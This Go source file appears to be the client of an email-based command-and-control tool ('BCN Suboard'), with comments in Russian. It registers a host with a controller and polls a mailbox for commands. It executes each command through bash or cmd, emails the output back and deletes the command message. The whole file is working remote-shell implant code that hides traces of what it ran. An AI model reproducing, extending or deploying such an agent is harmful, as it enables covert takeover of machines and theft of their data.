package main

import (
	"fmt"
	"log"
	"os"
	"os/exec"
	"os/signal"
	"runtime"
	"strings"
	"syscall"
	"time"

	"github.com/stifild/sturmvogel/bcn/internal/communication"
	"github.com/stifild/sturmvogel/bcn/internal/utils"
)

// Задержка между проверками почты для suboard
const suboardDelay = 3500 * time.Millisecond

func initiateSuboard() {
	log.Println("Инициализация BCN Suboard...")

	// Инициализация утилит
	utilsObj := &utils.Utils{}

	// Загружаем конфигурацию
	config := &utils.Config{}
	if err := utilsObj.LoadJSON(envPath, config); err != nil {
		log.Fatalf("Ошибка загрузки конфигурации: %v", err)
	}

	// Инициализация email-коммуникатора
	emailCom, err := communication.NewEmailCommunicator(envPath)
	if err != nil {
		log.Fatalf("Ошибка инициализации EmailCommunicator: %v", err)
	}

	// Получаем информацию о компьютере
	hostname, err := os.Hostname()
	if err != nil {
		log.Fatalf("Ошибка получения имени компьютера: %v", err)
	}

	osInfo := fmt.Sprintf("%s %s", runtime.GOOS, runtime.GOARCH)
	computerInfo := fmt.Sprintf("%s, %s", hostname, osInfo)

	log.Printf("Компьютер: %s", computerInfo)
	log.Println("Отправка запроса на идентификацию серверу...")

	// Отправка запроса на идентификацию серверу
	err = emailCom.Send(
		computerInfo,
		"0.0.0", // Адрес сервера
		"IND",
		fmt.Sprintf("Requesting network address for %s", hostname),
	)
	if err != nil {
		log.Fatalf("Ошибка отправки запроса на идентификацию: %v", err)
	}

	// Ожидаем подтверждения от сервера
	receivedAddress := false
	log.Println("Ожидаем назначения сетевого адреса от сервера...")

	// Задаем таймаут ожидания адреса
	timeout := time.Now().Add(30 * time.Second)

	// Логируем текущее состояние адреса
	log.Printf("Текущая настройка адреса: %s", emailCom.GetMyAddress())

	// Даем серверу время на обработку запроса и отправку ответа
	time.Sleep(3 * time.Second)

	for !receivedAddress && time.Now().Before(timeout) {
		hasMessages, err := emailCom.CheckForMessages()
		if err != nil {
			log.Printf("Ошибка проверки наличия сообщений: %v", err)
			time.Sleep(time.Second)
			continue
		}

		if hasMessages {
			// Используем обновленный метод receive(), который обрабатывает все сообщения
			response, flag, err := emailCom.Receive()
			if err != nil {
				log.Printf("Ошибка получения сообщений: %v", err)
				time.Sleep(time.Second)
				continue
			}

			log.Printf("Получен ответ с флагом: %s, содержимое: %v", flag, response)

			// Проверяем, был ли установлен адрес после обработки сообщения
			myAddress := emailCom.GetMyAddress()
			if myAddress != "" {
				log.Printf("Адрес был установлен через обработку сообщения: %s", myAddress)
				receivedAddress = true

				// Отправляем подтверждение серверу
				err = emailCom.Send(
					myAddress,
					"0.0.0",
					"ACK",
					fmt.Sprintf("Address %s acknowledged by %s", myAddress, hostname),
				)
				if err != nil {
					log.Printf("Ошибка отправки подтверждения: %v", err)
				}
				break
			}
		}
		time.Sleep(time.Second)
	}

	// Проверяем, установлен ли адрес
	if !receivedAddress {
		myAddress := emailCom.GetMyAddress()
		if myAddress != "" {
			log.Printf("Адрес был установлен через EmailCommunicator: %s", myAddress)
			receivedAddress = true
		}
	}

	if !receivedAddress {
		log.Fatal("Не удалось получить действительный сетевой адрес от сервера. Выход.")
	}

	log.Printf("Успешное подключение к сети BCN с адресом: %s", emailCom.GetMyAddress())
	log.Printf("Проверка - конечный адрес EmailCommunicator: %s", emailCom.GetMyAddress())

	// Обработка сигналов для корректного завершения
	sigs := make(chan os.Signal, 1)
	signal.Notify(sigs, syscall.SIGINT, syscall.SIGTERM)

	// Создаем канал для завершения цикла обработки команд
	done := make(chan struct{})

	// Запускаем цикл обработки команд в отдельной горутине
	go func() {
		processCommandsLoop(emailCom, hostname, done)
	}()

	// Ожидаем сигнала для завершения
	sig := <-sigs
	log.Printf("Получен сигнал %v, завершение работы...", sig)

	// Отправляем сигнал для завершения горутины обработки команд
	close(done)

	// Отправляем уведомление о завершении работы
	err = emailCom.Send(nil, "0.0.0", "FIN", "I am shutting down")
	if err != nil {
		log.Printf("Ошибка отправки уведомления о завершении: %v", err)
	}

	log.Println("Suboard BCN остановлен")
}

func processCommandsLoop(emailCom *communication.EmailCommunicator, hostname string, done chan struct{}) {
	log.Println("Запущен цикл обработки команд")

	for {
		select {
		case <-done:
			log.Println("Цикл обработки команд остановлен")
			return
		default:
			hasMessages, err := emailCom.CheckForMessages()
			if err != nil {
				log.Printf("Ошибка проверки наличия сообщений: %v", err)
				time.Sleep(suboardDelay)
				continue
			}

			if hasMessages {
				// Используем обновленный метод receive для обработки всех сообщений
				result, flag, err := emailCom.Receive()
				if err != nil {
					log.Printf("Ошибка получения сообщений: %v", err)
					time.Sleep(suboardDelay)
					continue
				}

				// Проверяем тип результата - это может быть слайс с 3 элементами (command, flag, email_id)
				if slice, ok := result.([]interface{}); ok && len(slice) == 3 {
					command, ok1 := slice[0].(string)
					flag, ok2 := slice[1].(string)
					emailID, ok3 := slice[2].(uint32)

					if ok1 && ok2 && ok3 && flag == "IC" && command != "" {
						log.Printf("Получена команда для выполнения: '%s' с флагом '%s' и email_id '%d'", command, flag, emailID)

						// Удаляем символы возврата каретки и перевода строки
						command = strings.ReplaceAll(command, "\r", "")
						command = strings.ReplaceAll(command, "\n", "")
						log.Printf("Выполнение команды: '%s'", command)

						// Отправляем подтверждение ACK серверу
						err = emailCom.Send(
							"",
							"0.0.0",
							"ACK",
							fmt.Sprintf("Command '%s' acknowledged by %s", command, hostname),
						)
						if err != nil {
							log.Printf("Ошибка отправки подтверждения: %v", err)
						} else {
							log.Printf("ACK отправлен серверу для команды: %s", command)
						}

						// Выполняем команду и получаем результат
						var cmd *exec.Cmd
						if runtime.GOOS == "windows" {
							cmd = exec.Command("cmd", "/C", command)
						} else {
							cmd = exec.Command("bash", "-c", command)
						}

						// Канал для отслеживания таймаута
						done := make(chan error, 1)
						var output string
						var cmdErr error

						// Запускаем выполнение команды в отдельной горутине
						go func() {
							outBytes, err := cmd.CombinedOutput()
							output = string(outBytes)
							done <- err
						}()

						// Ожидаем результат с таймаутом
						select {
						case cmdErr = <-done:
							// Команда выполнена
							if cmdErr != nil {
								output = fmt.Sprintf("Error: %s\nOutput: %s", cmdErr.Error(), output)
								log.Printf("Ошибка выполнения команды: %v", cmdErr)
							} else {
								log.Printf("Команда успешно выполнена. Результат: %s", output)
							}

							// Отправляем результат на сервер
							log.Printf("Отправка результата команды на сервер: %s", output)
							err = emailCom.Send(
								output,
								"0.0.0",
								"IR",
								fmt.Sprintf("Command execution result from %s", hostname),
							)
							if err != nil {
								log.Printf("Ошибка отправки результата команды: %v", err)
							} else {
								log.Printf("Результат команды отправлен на сервер с флагом IR")
							}

							// Удаляем сообщение с командой после выполнения
							err = emailCom.DeleteMessage(emailID)
							if err != nil {
								log.Printf("Ошибка удаления сообщения: %v", err)
							} else {
								log.Printf("📮 Удалено сообщение с командой после выполнения")
							}

						case <-time.After(10 * time.Second):
							// Команда превысила таймаут
							if cmd.Process != nil {
								cmd.Process.Kill()
							}
							errorMsg := "Command execution timed out after 10 seconds"
							log.Printf("Ошибка: %s", errorMsg)

							// Отправляем сообщение об ошибке на сервер
							err = emailCom.Send(
								errorMsg,
								"0.0.0",
								"ERR",
								fmt.Sprintf("Command execution failed on %s", hostname),
							)
							if err != nil {
								log.Printf("Ошибка отправки сообщения об ошибке: %v", err)
							} else {
								log.Printf("Сообщение об ошибке отправлено на сервер")
							}

							// Удаляем сообщение с командой после попытки выполнения
							err = emailCom.DeleteMessage(emailID)
							if err != nil {
								log.Printf("Ошибка удаления сообщения: %v", err)
							} else {
								log.Printf("📮 Удалено сообщение с командой после таймаута")
							}
						}
					}
				} else if flag == "EDCN" {
					log.Println("Получена команда экстренного отключения от сервера")
					return
				}
			}

			// Ждем перед следующей проверкой
			time.Sleep(suboardDelay)
		}
	}
}